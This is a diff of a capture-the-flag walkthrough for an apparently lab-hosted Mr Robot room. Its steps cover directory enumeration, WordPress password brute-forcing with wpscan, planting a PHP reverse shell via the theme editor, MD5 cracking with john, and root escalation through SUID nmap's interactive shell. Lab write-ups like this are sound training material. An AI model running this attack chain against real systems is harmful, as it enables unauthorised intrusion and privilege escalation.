@@ -15,7 +15,9 @@ Steps:
 #Join the room
 
 #Task 1:instructions 
+
 #Task2 :
+
     KEY1 & 2 & 3 :
     #Cope the IP Address to the clipboard
     #Open terminal  make a folder to work with this CTF using the command [mkdir]
@@ -24,6 +26,9 @@ Steps:
     #Use burp suit > proxy > open browser > intercept off and paste the ip address
     #Use gobuster with the wordlist downloaded from my githum [sudo gobuster -u http://10.10.44.213/ dir -w wordlistgobuster.txt -x .txt | tee gobusterout.txt]
     #Found /wp-admin , robots.txt
+    #check both the url
+    #on checking robots.txt you'll get they open the [IP/key-1-of-3.txt] **1st key**
+    
     #Use wp-scan [ sudo wpscan --url 10.10.35.137 --passwords simplefsociety.txt -U simplefsociety.txt ]
     #Download the shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
     #inside wp dashboard go to  appreance and editor
@@ -33,11 +38,12 @@ Steps:
     #copy the md5 has and use john the ripper and save as mrrobot.hash
     #use john the ripper tool   [sudo john mrrobot.hash --wordlist=simplefsociety.txt --format=Raw-MD5]
     #got the password abcdefghijklmnopqrstuvwxyz
-    #type su robot and type the password and cat the key 2
+    #type su robot and type the password and cat the **2nd key**
+    
     #use the command [find / -perm +6000 2>/dev/null | grep '/bin'] which checks the privilage excaltion to goto root
     #nmap is inside it 
     #now use https://gtfobins.github.io/gtfobins/nmap/	to  get the command for privillage excalation
     #nmap --interactive     //command to shift nmap interactive mode
     #nmap> !sh      //command to shit root
     # ls /root/     //gives the third key
-    #open the [IP/key-1-of-3.txt] //done for the first key.
+    # cat the final **3rd key**
